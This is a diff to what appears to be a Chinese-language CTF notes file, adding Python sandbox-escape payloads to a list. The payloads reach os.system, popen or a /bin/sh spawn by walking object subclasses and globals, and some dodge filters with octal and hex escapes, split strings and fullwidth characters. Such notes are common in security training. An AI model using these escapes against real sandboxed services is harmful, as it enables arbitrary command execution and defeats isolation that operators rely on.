@@ -341,6 +341,8 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
   - `print.__self__.__loader__.load_module('o''s').spawnl(0, "/bin/sh", "a")`
   - `print(().__class__.__mro__[1].__subclasses__()[84]().load_module('o'+'s').__dict__['sy'+'stem']('cmd'))`
   - `print([x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__['system']('cmd'))`
+  - `print(print.__self__.__loader__().load_module('o' + 's').__dict__['pop'+'en']('cmd').read())`
+  - `print.__self__.__dict__["__import__"]("os").system("cmd")`
 - 关于`eval(payload)`中payload的控制
   - 不使用26个字母中的前13个字母（使用10进制ascii绕过）：`exec("pr\x69nt(op\x65n('\x66'+\x63\x68r(108)+'\x61\x67.txt').r\x65\x61\x64())")`
   - 不使用26个字母中的后13个字母（使用8进制）：`exec("\160\162i\156\164(\157\160e\156('flag.\164\170\164').\162ead())")`,`exec("\160\162\151\156\164\050\157\160\145\156\050\047\146\154\141\147\056\164\170\164\047\051\056\162\145\141\144\050\051\051")`，`\145\166\141\154\50\151\156\160\165\164\50\51\51`(`eval(input)`)
@@ -349,6 +351,9 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
   - 不使用`__`:`()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[124].get_data('.','flag.txt')`(第二个`＿`是unicode里面的下划线，python自动标准化成`_`)
   - 使用特殊字体：`ｂｒｅａｋｐｏｉｎｔ()`（开启pdb）
 - 当空格被过滤时，可以用tab键代替：`import    os`
+- `[module for module in ().__class__.__bases__[0].__subclasses__() if 'Import' in module.__name__][0].load_module('os').system('cmd')`,通过`class '_frozen_importlib.BuiltinImporter'>`模块导入os执行命令
+- `[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('cmd')`
+- `[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("cmd")`
 
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
